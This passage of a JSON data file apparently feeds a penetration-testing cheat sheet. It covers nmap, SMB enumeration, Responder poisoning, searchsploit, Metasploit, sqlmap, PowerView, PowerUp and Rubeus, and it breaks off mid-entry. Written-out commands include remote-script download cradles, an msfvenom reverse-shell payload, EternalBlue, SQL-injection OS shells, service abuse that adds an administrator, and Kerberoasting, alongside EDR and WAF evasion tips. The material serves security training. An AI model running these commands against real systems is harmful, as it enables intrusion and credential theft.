[["-Pn", "Skip host discovery, treat every target as up (essential when ICMP is blocked)"], ["-p-", "Scan all 65535 TCP ports"], ["-oA <name>", "Save output in all formats (normal, XML, grepable)"], ["-T0..T5", "Timing template, 0=paranoid/slow, 5=insane/fast"], ["--script vuln", "Run the vulnerability-detection NSE script category"], ["-6", "Scan an IPv6 target"]], "combos": [{"title": "The standard opening infrastructure scan", "explain": "This exact sequence is the default 'day one' move on almost every infra engagement: a fast top-1000 scan to get moving immediately, followed by a full-port background scan so nothing gets missed while you start manual work on what the quick scan already found.", "code": "sudo nmap -sS -T4 -Pn -oN quick.txt $IP\nsudo nmap -sS -sV -sC -p- -T4 -Pn -oA full_$IP $IP &"}, {"title": "Firewall-evasive scan when the quick scan comes back empty", "explain": "When a host is clearly alive (responds to other protocols) but nmap shows all ports filtered, pros suspect stateful firewall filtering by source/rate and try fragmentation, decoys, and a slower timing template before assuming the host is truly locked down.", "code": "sudo nmap -sS -Pn -f --mtu 24 -T2 -p 1-1000 $IP\nsudo nmap -sS -Pn -D RND:10 -T2 $IP"}, {"title": "SMB-first triage on an internal engagement", "explain": "On internal AD assessments, port 445 is checked first and immediately chained into vulnerability scripts and share enumeration, because SMB misconfigurations remain one of the highest-yield findings on internal networks.", "code": "nmap -p 445 --open -oG smb_hosts.gnmap $SUBNET/24\nnmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery $(grep Up smb_hosts.gnmap | cut -d\" \" -f2 | tr \"\\n\" \",\" )"}]}, {"id": "smb", "cat": "Enumeration", "name": "SMB Toolkit (smbclient / smbmap / enum4linux)", "tagline": "Enumerating and interacting with Windows/Samba file-sharing services.", "overview": "SMB (port 445/139) is consistently the single richest enumeration target on internal Windows networks \u2014 shares leak documents, scripts leak credentials, and null-session enumeration alone can hand over a full user list. This trio covers listing, exploring, and bulk-enumerating SMB in different depths.", "note": "<code>enum4linux</code> (the classic Perl tool) is increasingly superseded in practice by <code>enum4linux-ng</code>, a Python rewrite with cleaner JSON output and better handling of modern Samba/Windows versions \u2014 the classic tool still works and the flags shown are correct, but expect it to be slower and noisier on current targets. Also note: since Windows 10 1709 / Server 2016+, anonymous ('null session') enumeration is disabled by default, so anonymous listing failing does not necessarily mean the host is unusually hardened \u2014 it's the modern baseline.", "info": null, "commands": [{"label": "List shares anonymously", "code": "smbclient -L //$IP/ -N", "why": "Check whether the server permits anonymous ('null session') share listing.", "look": "A list of share names and comments.", "next": "Attempt anonymous connection to any promising share.", "err": "NT_STATUS_ACCESS_DENIED \u2014 anonymous listing is disabled (the default since Win10 1709+); retry with valid creds."}, {"label": "Connect to a share with credentials", "code": "smbclient //$IP/<share_name> -U zak%zak123", "why": "Authenticate and browse a specific share interactively.", "look": "An smb: \\> prompt confirming successful auth.", "next": "Use ls, get, put, recurse ON; mget * to pull files of interest.", "err": "Access denied \u2014 the account may lack permission on that specific share even though auth succeeded."}, {"label": "Enumerate all accessible shares with creds", "code": "smbmap -H $IP -u zak -p zak123", "why": "One command to see every share a given account can reach and at what permission level.", "look": "READ-ONLY vs READ, WRITE annotations per share.", "next": "Prioritize any share marked WRITE \u2014 potential for webshell/script drop or persistence.", "err": "No shares listed \u2014 account may be valid but have zero share access."}, {"label": "Recursively list share contents", "code": "smbmap -H $IP -r <share_name> -u zak -p zak123", "why": "Full recursive directory listing without manually browsing in smbclient.", "look": "Interesting filenames \u2014 config.ini, unattend.xml, backup.zip, *.kdbx.", "next": "Download anything sensitive with smbmap's --download flag or smbclient get.", "err": "Empty share \u2014 nothing of value at this location."}, {"label": "Full anonymous enumeration", "code": "enum4linux -a $IP", "why": "Comprehensive one-shot sweep: users, groups, shares, password policy, OS info \u2014 the classic first move on any SMB host.", "look": "User/group lists usable for spraying, and password policy (lockout threshold) to plan safe spray timing.", "next": "Build a spray candidate list from usernames; check policy before attempting any auth attack.", "err": "Mostly empty \u2014 null sessions are disabled by default on modern builds; retry with any low-priv creds you already have."}], "options": [["-N", "smbclient: no password / anonymous"], ["-L", "smbclient: list shares"], ["-r", "smbmap: recursive listing"], ["--upload/--download", "smbmap: file transfer"], ["-a", "enum4linux: run all checks"], ["-U/-G/-P", "enum4linux: users only / groups only / password policy only"]], "combos": [{"title": "Null-session-to-credentialed pivot", "explain": "Always try anonymous first \u2014 even a failed null session sometimes still permits RPC-based user enumeration via other protocols. If any low-privilege creds are obtained elsewhere (e.g. via Responder), immediately re-run the full enum4linux/smbmap sweep authenticated, since Windows exposes far more over SMB to any valid domain account than to anonymous.", "code": "smbclient -L //$IP/ -N\nenum4linux -a $IP  # try anonymous first\n# after obtaining creds via Responder/spray:\nenum4linux -a -u zak -p zak123 $IP\nsmbmap -H $IP -u zak -p zak123 -r"}, {"title": "Password-policy-aware spray planning", "explain": "Pulling the domain lockout policy before spraying is standard due diligence \u2014 pros calculate a safe attempt interval (e.g. 1 attempt per 30 minutes for a 5-attempt/30-min lockout window) to avoid locking out real users, which is a common way careless testers cause an incident.", "code": "enum4linux -P $IP\n# note lockout threshold + observation window, then:\ncrackmapexec smb $SUBNET/24 -u users.txt -p \"Summer2026!\" --continue-on-success"}]}, {"id": "responder", "cat": "Credential Attacks", "name": "Responder", "tagline": "LLMNR/NBT-NS/mDNS poisoning to capture NTLMv1/v2 hashes off the wire.", "overview": "Responder answers name-resolution broadcasts that Windows sends when DNS fails to resolve a hostname \u2014 a very common occurrence from typos, mapped drives, and outdated scripts. It's one of the single highest-yield tools on an internal engagement because it requires zero prior access, just L2 network presence.", "note": "The <code>--lm</code> option shown in the original file is correct as documented (forces LM hash downgrade in Responder's config), though it is rarely useful today since virtually no clients still negotiate LM \u2014 it exists mostly for legacy Windows XP/2003 environments. In 2026 the tool of choice for turning captured hashes into access is almost always relaying them live with <code>ntlmrelayx.py</code> rather than cracking offline, since modern password policies make offline cracking of NTLMv2 slow and unreliable.", "info": "Responder should always be run in <code>-A</code> (analyze) mode first on any new network to see what's actually broadcasting before you start poisoning \u2014 poisoning blind on an unfamiliar segment risks breaking legitimate name resolution for other hosts.", "commands": [{"label": "Analyze mode (passive, no poisoning)", "code": "sudo responder -I eth0 -A", "why": "See what LLMNR/NBT-NS traffic is naturally occurring before actively interfering with anything.", "look": "Broadcast requests for hostnames that don't exist in DNS \u2014 classic signs of typos or stale scripts/mapped drives.", "next": "If interesting broadcasts appear, switch to active poisoning mode.", "err": "No broadcasts seen \u2014 LLMNR/NBT-NS may already be disabled via GPO on this network."}, {"label": "Standard active poisoning", "code": "sudo responder -I eth0", "why": "Actively answer LLMNR/NBT-NS/mDNS broadcasts as if you were the requested host, prompting the victim to authenticate to you.", "look": "[SMB] NTLMv2-SSP Hash captured for DOMAIN\\\\username in the console output.", "next": "Crack offline with hashcat -m 5600, or relay live with ntlmrelayx.py for immediate access.", "err": "No hashes captured \u2014 network may have LLMNR/NBT-NS disabled or you're not on the same broadcast segment."}, {"label": "WPAD rogue proxy poisoning", "code": "sudo responder -I eth0 -w", "why": "Serves a malicious WPAD (proxy auto-config) file to browsers configured to auto-detect proxy settings, forcing NTLM auth to you.", "look": "Additional NTLM hash captures from browser-based WPAD requests.", "next": "Combine with the standard capture output and crack/relay as usual.", "err": "No WPAD requests \u2014 modern browsers often have WPAD auto-detection disabled by default."}], "options": [["-I <iface>", "Interface to listen on"], ["-A", "Analyze mode \u2014 observe only, no poisoning"], ["-w", "Enable rogue WPAD proxy server"], ["-v", "Verbose output"], ["--lm", "Force legacy LM hash downgrade (rarely useful in 2026)"]], "combos": [{"title": "Capture-and-relay instead of crack (the modern default)", "explain": "Since NTLMv2 is slow to crack and modern password policies push length/complexity, the standard 2026 workflow is to disable Responder's own SMB/HTTP servers and relay captured auth attempts live to a target where that account has admin rights \u2014 often netting a shell in minutes with zero cracking required.", "code": "# In /etc/responder/Responder.conf set SMB = Off and HTTP = Off\nsudo responder -I eth0\n# in a second terminal:\nsudo impacket-ntlmrelayx -tf targets.txt -smb2support"}, {"title": "Analyze-first hygiene on unfamiliar segments", "explain": "Running analyze mode for 10-15 minutes before poisoning is standard professional practice on client networks \u2014 it avoids disrupting legitimate traffic and gives you a read on how 'noisy' the segment already is, which also helps justify findings in the report.", "code": "sudo timeout 900 responder -I eth0 -A -v | tee analyze.log\ngrep -i \"NBT-NS\\|LLMNR\" analyze.log | sort | uniq -c | sort -rn\nsudo responder -I eth0"}]}, {"id": "searchsploit", "cat": "Exploitation", "name": "searchsploit", "tagline": "Offline command-line interface to the Exploit-DB archive.", "overview": "searchsploit lets you query a locally-mirrored copy of Exploit-DB without touching the internet, which matters on engagements with restricted egress or air-gapped lab environments. It pairs directly with the version strings nmap -sV hands you.", "note": "All commands in the original file are accurate. One important caveat worth adding: an Exploit-DB entry appearing for a service/version is not proof the target is exploitable \u2014 always read the PoC source with <code>searchsploit -x <id></code> or <code>-p</code> before running anything, since many PoCs need adaptation (hardcoded offsets, wrong target OS build, requires specific pre-conditions).", "info": null, "commands": [{"label": "Search for a specific version", "code": "searchsploit \"vsftpd 2.3.4\"", "why": "Find any known public exploit tied to an exact software version discovered during scanning.", "look": "A table of matching exploits with ID, title, and path.", "next": "Examine the exploit source before running it.", "err": "No results \u2014 try a broader term (just the product name) or check searchsploit -u is current."}, {"label": "Title-only search", "code": "searchsploit -t \"apache 2.4\"", "why": "Restrict matching to the exploit title field, cutting noise from unrelated description text.", "look": "A narrower, more relevant result set.", "next": "Investigate each match's applicability to your exact target build.", "err": "No results \u2014 drop -t and search broadly instead."}, {"label": "Examine an exploit's full path / source", "code": "searchsploit -p <exploit_id>", "why": "Get the exact file path so you can read the PoC source before trusting or running it.", "look": "Full filesystem path under /usr/share/exploitdb/.", "next": "cat or less the file to understand exact usage, required arguments, and any manual edits needed.", "err": "Invalid ID \u2014 re-check the ID from the search results table."}, {"label": "Mirror an exploit locally", "code": "searchsploit -m <exploit_id>", "why": "Copy the exploit source into your working directory to modify/compile/run.", "look": "Confirmation message that the file was copied.", "next": "Adjust hardcoded values (target IP, offsets, ports) as needed, then compile/run.", "err": "ID not found \u2014 verify against the search output."}, {"label": "Update the local database", "code": "searchsploit -u", "why": "Keeps your offline mirror current with newly published PoCs.", "look": "Update-in-progress / completed message.", "next": "Run periodically, ideally at the start of every engagement.", "err": "Update fails \u2014 check network access; some environments intentionally restrict this."}], "options": [["-t", "Search titles only"], ["-p <id>", "Show full exploit path"], ["-m <id>", "Mirror/copy exploit locally"], ["-x <id>", "Examine/print exploit source directly"], ["-u", "Update local Exploit-DB copy"], ["-w", "Show the original Exploit-DB web URL for a result"]], "combos": [{"title": "Version-string-to-PoC pipeline straight from nmap", "explain": "Feeding nmap's service/version output directly into searchsploit is the fastest way to triage a large port scan for known, weaponizable vulnerabilities without manually copy-pasting each banner.", "code": "nmap -sV -oX scan.xml $IP\nsearchsploit --nmap scan.xml"}, {"title": "Read-before-run discipline", "explain": "Never fire a downloaded PoC blind \u2014 professionals always read the source for hardcoded values (target OS build, offsets, required auth) and adapt before execution, since many Exploit-DB entries are proof-of-concept quality, not production-grade tooling.", "code": "searchsploit -p 49757\nsearchsploit -x 49757   # print source directly to review\nsearchsploit -m 49757 && cd 49757_dir && less *.py"}]}, {"id": "metasploit", "cat": "Exploitation", "name": "Metasploit Framework", "tagline": "The all-in-one exploitation, payload generation, and post-exploitation framework.", "overview": "Metasploit remains the default framework for weaponizing known vulnerabilities quickly, generating payloads (msfvenom), and running structured post-exploitation via Meterpreter. It shines most on infrastructure/legacy-heavy internal engagements; for modern EDR-monitored Windows environments, its default payloads are heavily signatured and usually need additional obfuscation/staging to land.", "note": "All commands are correct as documented. One important, current caveat: default msfvenom-generated payloads (especially <code>windows/x64/meterpreter/reverse_tcp</code> written straight to an .exe) are trivially detected by essentially every modern EDR product \u2014 in 2026 practice this payload type is used almost exclusively in lab/CTF settings or against known-unmonitored legacy hosts, not as a primary delivery method on a real assessment with EDR present.", "info": "On engagements against EDR-protected hosts, most testers now favor a custom C2 (Sliver, Havoc, Cobalt Strike) for initial delivery and reserve Metasploit for its exploit modules and post-exploitation library once a foothold already exists via another channel.", "commands": [{"label": "Search for a module", "code": "search vsftpd 2.3.4", "why": "Find Metasploit modules (exploit/auxiliary/post) matching a known service/version.", "look": "A results table of matching modules with type and rank.", "next": "use the most relevant module and inspect its options.", "err": "No modules found \u2014 check searchsploit for a manual PoC instead."}, {"label": "Load and configure a module", "code": "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS $IP\nshow options", "why": "Enter the module's context and configure required parameters before firing.", "look": "Prompt changes to reflect the loaded module; show options confirms what's still unset.", "next": "Set any remaining required options, then run exploit.", "err": "Unrecognized option \u2014 double check exact option names via show options."}, {"label": "Launch the exploit", "code": "exploit", "why": "Fire the configured module against the target.", "look": "'Meterpreter session 1 opened' or equivalent shell confirmation.", "next": "Begin post-exploitation (getsystem, hashdump, migrate).", "err": "Exploit failed \u2014 target may be patched, or a firewall is blocking the callback; try a bind payload instead of reverse."}, {"label": "Attempt privilege escalation to SYSTEM", "code": "getsystem", "why": "Automatically tries a set of known local Windows techniques to escalate a session to NT AUTHORITY\\\\SYSTEM.", "look": "'...got system' confirmation.", "next": "Dump credentials (hashdump) or install persistence once at SYSTEM.", "err": "Fails on modern/patched hosts \u2014 fall back to manual privesc enumeration (WinPEAS, PowerUp)."}, {"label": "Generate a Windows reverse shell payload", "code": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o shell.exe", "why": "Build a standalone executable that calls back to your listener when run on the target.", "look": "shell.exe written to disk.", "next": "Set up a matching multi/handler listener before delivering the file.", "err": "Errors usually mean a payload/format mismatch \u2014 verify architecture (x64 vs x86) matches the target."}, {"label": "Set up a matching listener", "code": "use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\nrun", "why": "Catch the callback connection from a payload already delivered and executed on the target.", "look": "'Meterpreter session 1 opened'.", "next": "Interact with the session and begin post-exploitation.", "err": "No connection \u2014 check firewall rules and that the payload actually executed on target."}], "options": [["RHOSTS/RHOST", "Target host(s)"], ["LHOST/LPORT", "Your listener IP/port for reverse payloads"], ["-f <format>", "msfvenom output format (exe, elf, raw, etc.)"], ["-e <encoder>", "msfvenom payload encoder (limited AV evasion value today)"], ["-x <template>", "msfvenom: inject payload into an existing executable template"]], "combos": [{"title": "Confirm-before-fire on SMB findings", "explain": "Given how disruptive a failed EternalBlue-class exploit attempt can be (blue-screening production servers), pros always run the dedicated scanner/check auxiliary module first and only fire the real exploit once vulnerability is confirmed, never skipping straight to exploit on a hunch from an nmap script alone.", "code": "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS $SUBNET/24\nrun\n# only if confirmed vulnerable:\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS $IP\nexploit"}, {"title": "Resource script for repeatable engagement setup", "explain": "Rather than retyping handler setup every time a session drops, experienced operators keep a .rc resource script that spins up the same listener config instantly, which matters when a payload calls back intermittently.", "code": "cat > handler.rc << EOF\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.14.5\nset LPORT 4444\nexploit -j -z\nEOF\nmsfconsole -r handler.rc"}]}, {"id": "sqlmap", "cat": "Web Exploitation", "name": "sqlmap", "tagline": "Automated detection and exploitation of SQL injection, including full DB takeover.", "overview": "sqlmap automates the entire SQLi kill chain: detection, fingerprinting the DBMS, enumerating databases/tables/columns, dumping data, and in favorable conditions, reading/writing files or getting an OS shell. It should always follow, not replace, manual identification of a suspicious parameter.", "note": "All commands documented are accurate. Worth adding: sqlmap's default request rate and detection payloads are noisy and will trip most WAFs; <code>--random-agent</code>, <code>--tamper</code> scripts, and <code>--delay</code> are used together in practice, not in isolation, when a target sits behind a WAF like Cloudflare or ModSecurity. Also, <code>--batch</code> (accept all default answers non-interactively) is used constantly in real workflows to allow scripting sqlmap into a larger pipeline, and was missing from the original file.", "info": null, "commands": [{"label": "Basic scan of a URL parameter", "code": "sqlmap -u \"https://target.com/page.php?id=1\" --batch", "why": "Automatically test the id parameter for SQL injection across multiple techniques (boolean, time-based, error-based, UNION).", "look": "Confirmation of the parameter being injectable and which technique/DBMS was identified.", "next": "Move to --dbs to enumerate accessible databases.", "err": "Not injectable via default tests \u2014 try --level 5 --risk 3 for more exhaustive (and slower/riskier) checks."}, {"label": "Test a captured POST/authenticated request", "code": "sqlmap -r request.txt -p username --batch", "why": "Test a specific parameter within a raw HTTP request (captured via Burp) \u2014 necessary for POST bodies, JSON APIs, or authenticated sessions with cookies/tokens.", "look": "Injection confirmation scoped to the specified parameter.", "next": "Proceed to enumeration exactly as with a URL-based target.", "err": "Not vulnerable \u2014 try testing other parameters in the same request, or confirm the session/cookie in the request file is still valid."}, {"label": "Enumerate databases, then tables, then columns", "code": "sqlmap -u \"URL\" --dbs\nsqlmap -u \"URL\" -D appdb --tables\nsqlmap -u \"URL\" -D appdb -T users --columns", "why": "Standard drill-down: see what databases exist, pick the interesting one, then its tables, then the specific columns worth extracting.", "look": "Database/table/column names, prioritizing anything named users, accounts, credentials, admin.", "next": "Dump specific high-value columns rather than the whole database, to keep noise and runtime down.", "err": "Nothing enumerable \u2014 DB user may have restricted privileges; try --privileges to check what the current DB user can actually see."}, {"label": "Dump specific columns", "code": "sqlmap -u \"URL\" -D appdb -T users -C username,password --dump", "why": "Extract only the fields you actually need rather than a full noisy dump.", "look": "Extracted rows, often including password hashes.", "next": "Crack extracted hashes offline with hashcat, identifying the hash format first.", "err": "No data returned \u2014 check current DB user's SELECT privileges on that specific table."}, {"label": "Attempt an OS shell", "code": "sqlmap -u \"URL\" --os-shell", "why": "If the DBMS (commonly MySQL/MSSQL) and file-write privileges allow it, sqlmap can write a webshell stager and give an interactive OS-level shell.", "look": "An interactive OS command prompt through sqlmap.", "next": "Use the shell for further post-exploitation or to establish a proper reverse shell.", "err": "Fails \u2014 the DB account likely lacks FILE privilege, or the web root isn't writable/known."}], "options": [["--batch", "Never ask for confirmation, accept all defaults (needed for scripting/automation)"], ["--level/--risk", "Test thoroughness (1-5) / aggressiveness (1-3)"], ["--random-agent", "Randomize User-Agent to reduce WAF/signature matching"], ["--tamper=<script>", "Apply a payload obfuscation script to bypass WAF filtering"], ["--dbms=<name>", "Skip fingerprinting, specify DBMS directly to speed up testing"], ["--technique=<letters>", "Restrict to specific injection techniques (B/E/U/S/T/Q)"]], "combos": [{"title": "WAF-aware injection testing", "explain": "Against a WAF-fronted target, firing sqlmap at default settings just gets the source IP blocked. Professionals slow down, randomize fingerprints, and apply tamper scripts matched to the specific WAF vendor identified beforehand.", "code": "whatwaf -u \"https://target.com/page.php?id=1\"   # identify WAF vendor first\nsqlmap -u \"https://target.com/page.php?id=1\" --random-agent --tamper=space2comment,charencode --delay=2 --batch"}, {"title": "Burp-to-sqlmap handoff for authenticated injection", "explain": "For anything behind a login, the standard move is capturing a valid authenticated request in Burp, saving it to a file, and pointing sqlmap at that file rather than trying to reconstruct cookies/tokens manually.", "code": "# In Burp: right-click request > Save item, save as request.txt\nsqlmap -r request.txt -p search --level 3 --risk 2 --batch --dbs"}]}, {"id": "powerview", "cat": "Active Directory", "name": "PowerView.ps1", "tagline": "PowerShell toolkit for Active Directory situational awareness and enumeration.", "overview": "PowerView is the go-to tool for building a mental map of an AD environment from inside \u2014 users, groups, computers, GPOs, trusts, and (critically) ACLs that reveal abusable permission chains. It underpins the majority of AD attack paths that tools like BloodHound later visualize.", "note": "Important version note: the commands shown (<code>Get-NetUser</code>, <code>Get-NetGroupMember</code>, <code>Get-ObjectAcl</code>, etc.) are from the original/legacy PowerView syntax, which is still widely used and correct. However, the actively maintained <code>PowerSploit dev branch</code> and its successors rewrote these as noun-verb PowerShell-standard cmdlets (<code>Get-DomainUser</code>, <code>Get-DomainGroupMember</code>, <code>Get-DomainObjectAcl</code>, etc.) with additional filtering parameters. Both command sets function, but mixing versions in the same session can break \u2014 always confirm which PowerView build is loaded with <code>Get-Command *NetUser*</code> or <code>*DomainUser*</code> before assuming syntax.", "info": "On EDR-monitored environments, loading PowerView reflectively in-memory (IEX download-cradle) is now heavily flagged by AMSI/Defender \u2014 most current operators use .NET-based alternatives (SharpView) or LDAP queries via native <code>[adsisearcher]</code> accelerators to stay under the radar.", "commands": [{"label": "Load PowerView into memory", "code": "IEX (New-Object Net.WebClient).DownloadString('http://<your_ip>/PowerView.ps1')", "why": "Load the script directly in memory without writing to disk, reducing AV/EDR file-based detection surface.", "look": "No output \u2014 the prompt returns silently on success.", "next": "Run Get-NetDomain to confirm the module loaded correctly.", "err": "Blocked \u2014 AMSI/Defender likely flagged the download string; try an obfuscated loader or a signed alternative like SharpView.exe."}, {"label": "Get current domain info", "code": "Get-NetDomain", "why": "Confirm domain name, SID, and basic trust context for the current session.", "look": "Domain name and SID.", "next": "Move to Get-NetDomainController to identify DC targets.", "err": "Fails \u2014 host may not be domain-joined, or PowerView failed to load."}, {"label": "Enumerate all domain users", "code": "Get-NetUser | Select samaccountname,description", "why": "Pull the full user list, especially the description field which frequently contains leftover plaintext passwords or hints.", "look": "Usernames and any descriptions containing words like 'pwd', 'temp', 'reset'.", "next": "Flag suspicious descriptions for manual follow-up; use the user list for spraying.", "err": "Access denied on description \u2014 some environments restrict reading that attribute; try authenticated LDAP instead."}, {"label": "Enumerate members of Domain Admins", "code": "Get-NetGroupMember -GroupName \"Domain Admins\" -Recurse", "why": "Identify the highest-value accounts in the domain, including indirect (nested group) membership.", "look": "Usernames belonging to Domain Admins, directly or via nested groups.", "next": "Prioritize these accounts for Kerberoasting, session-hunting, or targeted phishing.", "err": "Empty \u2014 confirm you have read access to group membership; try -Recurse if nested groups exist."}, {"label": "Find computers with unconstrained delegation", "code": "Get-NetComputer -Unconstrained", "why": "Machines configured for unconstrained delegation cache TGTs of anyone who authenticates to them \u2014 a classic escalation vector.", "look": "Any computer object flagged with this setting.", "next": "If a Domain Admin or high-value account ever authenticates there, capture their TGT with Rubeus monitor mode.", "err": "None found \u2014 modern AD deployments increasingly disable unconstrained delegation by default; check constrained delegation instead."}, {"label": "Scan for abusable ACLs across the domain", "code": "Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}", "why": "Find objects where the current (or another) user has dangerous permissions like GenericAll, which can be abused to fully take over that object.", "look": "Object names paired with the specific abusable right.", "next": "Chase any hit where you (or a compromised account) hold the abusable right \u2014 this is often a direct path to privilege escalation.", "err": "Nothing found for current context \u2014 re-run once you compromise additional accounts, since ACL abuse paths are account-specific."}], "options": [["-Recurse", "Follow nested group memberships"], ["-Properties", "Return specific LDAP attributes only"], ["-ResolveGUIDs", "Translate raw ACL GUIDs into human-readable rights names"], ["-Domain <name>", "Target a specific domain in a multi-domain forest"]], "combos": [{"title": "The standard 'first hour in a domain' enumeration chain", "explain": "This exact sequence \u2014 domain context, then users/groups, then computers, then ACLs \u2014 is how most AD assessors build their initial map before ever touching BloodHound, because it's fast, scriptable, and works even when SharpHound collection is too noisy for the client's monitoring tolerance.", "code": "Get-NetDomain\nGet-NetDomainController\nGet-NetUser | select samaccountname,description | where description\nGet-NetGroupMember -GroupName \"Domain Admins\" -Recurse\nGet-NetComputer -Unconstrained\nInvoke-ACLScanner -ResolveGUIDs"}, {"title": "Description-field credential hunting", "explain": "An extremely common, low-effort finding: admins leaving temporary passwords in the AD description field. This is one of the first things any efficient assessor checks because it costs nothing and regularly yields direct credentials.", "code": "Get-NetUser -Properties description | Where-Object {$_.description -like \"*pass*\" -or $_.description -like \"*pwd*\"}"}]}, {"id": "powerup", "cat": "Privilege Escalation", "name": "PowerUp.ps1", "tagline": "Automated Windows privilege-escalation vector scanner for services, registry, and file permissions.", "overview": "PowerUp checks for the classic local-Windows privesc misconfigurations in one pass: unquoted service paths, weak service/binary permissions, AlwaysInstallElevated, and credentials left in unattended install files. It's the PowerShell-native counterpart to WinPEAS.", "note": "All documented functions are accurate and current. Worth flagging: PowerUp is one of the oldest and most heavily signatured PowerShell offensive tools in existence \u2014 running <code>Invoke-AllChecks</code> unmodified is very likely to trigger AMSI/Defender on any patched, monitored host in 2026. Most practitioners now either heavily obfuscate it, use the .NET port (Seatbelt covers overlapping checks with less signature exposure), or manually replicate specific checks (e.g. via <code>Get-CimInstance Win32_Service</code> and <code>icacls</code>) to stay under detection thresholds.", "info": null, "commands": [{"label": "Load PowerUp into memory", "code": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')", "why": "Load the script reflectively without touching disk.", "look": "No output on success.", "next": "Run Invoke-AllChecks.", "err": "AMSI blocks it \u2014 try an obfuscated variant or a signed alternative like Seatbelt.exe/WinPEAS."}, {"label": "Run every check at once", "code": "Invoke-AllChecks", "why": "Broad automated sweep across every known local privesc vector PowerUp knows about.", "look": "A structured report flagging each vulnerable finding (service, path, registry key).", "next": "Pick the highest-confidence finding and exploit it manually to confirm before trusting it.", "err": "Clean report \u2014 the host may genuinely be hardened; fall back to manual enumeration or kernel exploit research."}, {"label": "Check for unquoted service paths", "code": "Get-ServiceUnquoted", "why": "A service binary path containing spaces but no quotes lets Windows try multiple executable candidates in order \u2014 if you can write to an earlier path segment, your binary runs as that service's account.", "look": "Any service listed with an unquoted, space-containing path.", "next": "Check write access to each path segment with icacls, then drop a malicious binary named to match.", "err": "None found \u2014 modern Windows Server images increasingly quote service paths by default."}, {"label": "Check AlwaysInstallElevated registry key", "code": "Get-RegAlwaysInstallElevated", "why": "If both HKLM and HKCU AlwaysInstallElevated keys are set to 1, any user can install an MSI package as SYSTEM.", "look": "Confirmation that both registry values are set.", "next": "Build a malicious MSI with msfvenom (-f msi) and run it with msiexec /quiet /qn /i evil.msi.", "err": "Not set \u2014 this specific vector is unavailable; move to another check."}, {"label": "Exploit a vulnerable service directly", "code": "Invoke-ServiceAbuse -Name 'VulnSvc' -Command 'net localgroup administrators zak /add'", "why": "Automates reconfiguring and restarting a service you have modify rights on to run an arbitrary command as SYSTEM.", "look": "Successful addition of your user to local administrators.", "next": "Verify with net localgroup administrators, then obtain a SYSTEM shell.", "err": "Fails \u2014 you may lack SC_MANAGER rights to restart the service; check if a reboot/crash trigger is viable instead."}], "options": [["Invoke-AllChecks", "Run every available privesc check"], ["Get-ModifiableService", "Services with weak ACLs allowing reconfiguration"], ["Get-UnattendedInstallFile", "Search for leftover unattend.xml/sysprep credentials"], ["Write-ServiceBinary", "Replace a service binary with a payload"]], "combos": [{"title": "AV-aware manual replication of Invoke-AllChecks", "explain": "On EDR-monitored hosts where PowerUp itself gets flagged, experienced testers replicate the highest-yield individual checks manually using native cmdlets, since a single Get-CimInstance query rarely triggers the same signature as the full known-malicious script.", "code": "Get-CimInstance Win32_Service | Where-Object {$_.PathName -match ' ' -and $_.PathName -notmatch '^\"'} | Select Name,PathName\nGet-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue"}, {"title": "Confirm-before-exploit discipline", "explain": "Automated tools flag potential issues, but pros always manually verify actual write access with icacls or Get-Acl before attempting Invoke-ServiceAbuse, since a false positive attempt (e.g. trying to restart a service you can't actually control) can crash a production service and cause an unnecessary incident.", "code": "icacls \"C:\\Program Files\\Vulnerable App\\service.exe\"\nsc.exe sdshow VulnSvc\n# only proceed to Invoke-ServiceAbuse once write/reconfigure rights are confirmed"}]}, {"id": "rubeus", "cat": "Active Directory", "name": "Rubeus", "tagline": "C# toolkit for raw Kerberos ticket abuse \u2014 roasting, forging, and ticket manipulation.", "overview": "Rubeus is the primary tool for anything Kerberos-related on an AD engagement: extracting roastable service-account hashes, forging golden/silver tickets once you have the right secrets, and abusing delegation. It largely supersedes older Kerberoasting scripts due to its speed and built-in hashcat-ready output formatting.", "note": "All commands and concepts are accurate. Important operational note not in the original: Rubeus.exe is one of the most heavily signatured offensive .NET binaries in existence \u2014 running it unmodified on any EDR-protected host will almost certainly trigger an alert. Current practice favors running the compiled assembly reflectively in-memory (e.g. via Cobalt Strike's execute-assembly, a Sliver equivalent, or PowerShell's [Reflection.Assembly]::Load) rather than dropping Rubeus.exe to disk, and often requires a recompiled/renamed variant to dodge static signatures.", "info": "Kerberoasting only nets you a crackable hash \u2014 it is not itself a foothold. Its real value depends entirely on whether the roasted service account has a weak password, so always prioritize accounts with descriptive names (svc-sql, svc-backup) which are statistically far more likely to have old, weak, never-rotated passwords.", "commands": [{"label": "Kerberoast all roastable accounts", "code": "Rubeus.exe kerberoast /outfile:hashes.txt", "why": "Request TGS tickets for every account with an SPN set, then format the crackable portion for offline attack.", "look": "A file of hashcat-formatted (mode 13100) hashes for each roastable account.", "next": "Crack offline with hashcat -m 13100 hashes.txt rockyou.txt.", "err": "No roastable accounts \u2014 the domain may have no legacy service accounts with SPNs, which is a good security sign."}, {"label": "AS-REP roast accounts with no pre-auth", "code": "Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt", "why": "Accounts with Kerberos pre-authentication disabled will hand back an encrypted AS-REP to anyone who asks, with no valid creds required.", "look": "Hashcat-formatted (mode 18200) hashes for each vulnerable account.", "next": "Crack offline; these are often forgotten legacy/service accounts, statistically weaker passwords.", "err": "None found \u2014 pre-auth is required for all accounts, the modern default and best practice."}, {"label": "Request a TGT with known credentials", "code": "Rubeus.exe asktgt /user:zak /password:zak123 /ptt", "why": "Get a valid TGT for a known account and immediately inject it into the current logon session (/ptt).", "look": "TGT successfully requested and imported message.", "next": "Access resources as that user, or request specific service tickets (asktgs) using the new TGT.", "err": "Preauth failed \u2014 verify credentials are current and account isn't locked."}, {"label": "Forge a golden ticket", "code": "Rubeus.exe 